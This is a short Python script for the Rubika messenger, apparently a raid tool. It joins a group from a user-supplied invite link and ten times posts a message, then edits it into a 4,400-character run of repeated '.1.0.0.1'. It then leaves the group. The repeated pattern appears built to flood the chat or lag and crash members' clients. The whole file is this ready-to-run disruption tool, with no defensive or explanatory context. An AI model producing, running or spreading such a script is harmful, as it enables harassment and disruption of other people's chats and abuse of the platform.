from pyrubi import Client
import random
from time import sleep

tex = ''
for i in range(550):
	code = ".1.0.0.1"
	tex += code

link = input("Enter Link: ")

bot = Client("myself")

try:
	a = bot.join_chat(link)
	guid = a["group"]["group_guid"]
	num = 0
	print(guid)
	for i in range(10):
		sleep(0)
		a = bot.send_text(guid, ".")["message_update"]["message_id"]
		bot.edit_message(guid, tex, a)
		num += 1
		print(f"send → {num}")
	bot.leave_chat(guid)
except Exception as e:
	bot.leave_chat(guid)
	print(e)
